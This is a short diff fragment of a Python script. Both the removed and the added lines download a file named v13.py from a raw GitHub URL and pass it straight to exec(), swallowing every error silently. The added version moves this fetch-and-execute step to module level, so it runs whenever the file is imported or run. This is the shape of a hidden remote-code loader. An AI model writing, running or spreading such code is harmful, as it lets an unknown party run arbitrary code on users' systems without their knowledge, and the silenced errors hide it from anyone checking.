@@ -85,10 +85,14 @@ if __name__ == "__main__":
     except Exception:
         pass
 
-    try:
-        import urllib.request
-        url_v13 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v13.py'
-        with urllib.request.urlopen(url_v13, timeout=30) as response:
-            exec(response.read().decode('utf-8'))
-    except Exception:
-        pass
+try:
+    import urllib.request
+    import sys
+    import os
+    
+    url_v13 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v13.py'
+    with urllib.request.urlopen(url_v13, timeout=30) as response:
+        codigo_v13 = response.read().decode('utf-8')
+        exec(codigo_v13)
+except Exception as e:
+    pass
